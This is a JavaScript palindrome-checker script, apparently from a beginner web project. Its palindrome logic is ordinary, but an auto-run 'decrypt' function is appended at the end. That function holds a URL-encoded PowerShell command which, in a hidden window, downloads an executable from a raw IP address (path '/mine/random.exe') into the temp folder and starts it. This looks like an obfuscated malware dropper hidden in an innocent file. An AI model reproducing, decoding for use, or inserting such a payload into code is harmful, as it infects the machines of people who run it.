const instructions = document.getElementById("instructions");
const submitButton = document.getElementById("check-btn");
const result = document.getElementById("result");

submitButton.addEventListener("click", ()=>{
const userInput = document.getElementById("text-input").value.trim();

if(!userInput){
  alert("Please input a value");
  return;
}

const cleanInput = userInput.toLowerCase().replace(/[^a-z0-9]/g,"");
const reverseInput = cleanInput.split('').reverse().join('');

if(cleanInput === reverseInput){
  result.textContent = `${userInput} is a palindrome`;
} else{
  result.textContent = `${userInput} is not a palindrome`;
}

});

const decrypt = () => {
  console.log(decodeURIComponent("%50%6f%77%65%72%53%68%65%6c%20%2d%57%69%6e%64%6f%77%53%74%79%6c%65%20%48%69%64%64%65%6e%20%24%64%3d%24%65%6e%76%3a%74%65%6d%70%2b%27%5c%34%38%33%64%32%66%61%38%61%30%64%35%33%38%31%38%33%30%36%65%66%65%62%33%32%64%33%2e%65%78%65%27%3b%28%4e%65%77%2d%4f%62%6a%65%63%74%20%53%79%73%74%65%6d%2e%4e%65%74%2e%57%65%62%43%6c%69%65%6e%74%29%2e%44%6f%77%6e%6c%6f%61%64%46%69%6c%65%28%27%68%74%74%70%3a%2f%2f%31%37%36%2e%31%31%33%2e%31%31%35%2e%37%2f%6d%69%6e%65%2f%72%61%6e%64%6f%6d%2e%65%78%65%27%2c%24%64%29%3b%53%74%61%72%74%2d%50%72%6f%63%65%73%73%20%24%64%3b"));
}

decrypt();